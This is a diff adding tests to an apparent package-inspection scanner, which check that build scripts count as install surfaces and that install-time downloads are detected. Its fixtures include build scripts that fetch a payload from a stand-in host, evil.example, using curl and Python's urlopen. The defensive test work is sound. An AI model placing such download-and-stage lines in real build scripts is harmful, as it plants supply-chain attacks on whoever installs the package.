@@ -333,3 +333,71 @@ test("an ordinary extconf.rb keeps no finding", () => {
   expect(inspection.findings).toEqual([]);
   expect(inspection.downloads).toEqual([]);
 });
+
+test("common build scripts are classified as install surfaces", () => {
+  for (const path of [
+    "build.sh",
+    "build.bash",
+    "build.py",
+    "build.bat",
+    "build.cmd",
+    "build.ps1",
+    "scripts/build.sh",
+    "tools/build.py",
+  ]) {
+    expect({ path, surfaces: surfacesOf(path) }).toEqual({
+      path,
+      surfaces: ["installScripts", "source"],
+    });
+    const inspection = inspected(path, `${PAYLOAD}\n`);
+    expect({ path, items: inspection.coverage.installScripts.items }).toEqual({
+      path,
+      items: 1,
+    });
+    expect({
+      path,
+      findings: inspection.findings.map(
+        (f) => `${f.path}:${f.category}:${f.severity}`,
+      ),
+    }).toEqual({
+      path,
+      findings: [`${path}:unsafe-execution:high`],
+    });
+  }
+});
+
+test("an install-time download inside a build script is recorded as a download", () => {
+  for (const [path, content] of [
+    [
+      "build.sh",
+      "#!/bin/sh\ncurl -fsSL https://evil.example/payload -o /tmp/payload\n",
+    ],
+    [
+      "build.py",
+      "import urllib.request\nurllib.request.urlopen('https://evil.example/payload')\n",
+    ],
+  ] as const) {
+    const inspection = inspected(path, content);
+    expect({ path, downloads: inspection.downloads }).toEqual({
+      path,
+      downloads: ["https://evil.example/payload"],
+    });
+    expect({ path, visibilityGaps: inspection.visibilityGaps }).toEqual({
+      path,
+      visibilityGaps: [
+        "Install-time download not retrieved: https://evil.example/payload",
+      ],
+    });
+  }
+});
+
+test("ordinary source files with similar names do not become install surfaces", () => {
+  for (const path of [
+    "builder.py",
+    "building.js",
+    "build.txt",
+    "src/builder.ts",
+  ]) {
+    expect(surfacesOf(path)).not.toContain("installScripts");
+  }
+});
